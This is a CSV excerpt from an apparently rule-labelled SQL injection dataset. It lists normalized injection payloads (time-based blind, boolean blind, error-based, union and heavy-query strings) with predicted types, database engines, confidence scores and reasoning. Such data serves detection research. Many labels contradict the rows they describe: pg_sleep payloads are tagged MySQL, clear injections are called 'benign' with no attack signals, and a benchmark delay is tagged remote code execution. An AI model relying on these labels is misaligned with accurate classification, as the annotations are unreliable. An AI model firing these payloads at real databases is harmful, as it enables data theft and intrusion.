row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
10530,1 where 7021 = 7021 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) --,1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
10531,"1', ( select ( case when ( 1570 = 1570 ) then ( select 1570 from pg_sleep ( 5 ) ) else 1/ ( select 0 ) end ) )",1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
10532,"1"" ) where 8095 = 8095 and 2853 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 2853 = 2853 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) --",1,,boolean_blind,postgresql,0.95,8095 = 8095 and detected — boolean_blind injection (priority 8) on postgresql,rule-based
10533,"-5963"" or 9323 = 9323#",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10534,1' where 8584 = 8584 order by 1#,1,,boolean_blind,generic,0.95,8584 = 8584 or detected — boolean_blind injection (priority 8) on generic,rule-based
10535,1 ) ),1,,unknown,unknown,0.5,Insufficient information to classify,rule-based
10536,"1%' ) ) ) and 8514 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) and ( ( ( '%' = '",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
10537,"1' ) ) ) and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( ( ( 'vtno' = 'vtno",1,,error_based,generic,0.95,convert ( int detected — error_based injection (priority 4) on generic,rule-based
10538,"1' and elt ( 4249 = 4249,7259 ) and 'awjd' = 'awjd",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10539,"1 and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) )",1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
10540,"select * from generate_series ( 4975,4975,case when ( 4975 = 9615 ) then 1 else 0 end ) limit 1--",1,,heavy_query,generic,0.95,generate_series ( detected — heavy_query injection (priority 6) on generic,rule-based
10541,"1"" ) as tqxa where 6751 = 6751 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) --",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
10542,"1' ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) )",1,,rce,generic,0.95,0x694a4745 detected — rce injection (priority 1) on generic,rule-based
10543,"1 ) as qyic where 9736 = 9736 and elt ( 3114 = 3114,sleep ( 5 ) ) #",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
10544,"1%"" ) ) union all select null,null,null#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
10545,-2364' or 6743 = 7578,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
10546,-8538%' or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and '%' = ',1,,benign,generic,0.8,No attack signals detected in payload,rule-based
